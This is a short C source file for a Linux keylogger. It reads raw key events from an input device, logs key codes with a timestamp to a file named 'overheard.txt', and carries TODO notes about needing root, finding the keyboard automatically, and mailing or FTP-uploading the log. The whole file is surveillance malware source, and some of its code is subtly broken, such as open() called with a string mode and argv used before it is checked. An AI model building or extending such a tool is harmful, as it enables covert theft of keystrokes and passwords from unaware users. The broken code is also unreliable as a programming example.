/*
* ADD SLEEP
* ADD ERROR IF USER IS NOT ROOT
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
* ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
* IF STATEMENT--->SEND LOG FILE VIA EMAIL
* ELSE ERROR--->UPLOAD VIA FTP
* GRAB FROM IRC????
*/
#include <linux/input.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>


int main(int argc, char **argv) {
	FILE *listening;
	int key;
	key = open(argv[1], "r");	/* opens the event file */

	if(argc < 2) {
		printf("USAGE: %s <device>\n", argv[0]);
		return 1;
	}

	listening = fopen("overheard.txt", "a+");  	/* opens/creates the log */
	setbuf(listening, NULL);					/* forces immediate write to listening */
	
	if (listening == NULL) {
		fprintf(stderr, "ERROR: Log file not found\n");
		return 1;
	}

	time_t curtime;
	time(&curtime);
	fprintf(listening, "\n\n%s", ctime(&curtime));	/* adds timestamp */

	struct input_event ev;		/* using input_event so we 
								 * know what we're reading 
								 */
	while(1) {
		read(key, &ev, sizeof(struct input_event));
		if(ev.value == 0 && ev.type == 1) {			/* only register release state */
			fprintf(listening, "%i", ev.code);
		}
	}

	fclose(listening);

	return 0;
}
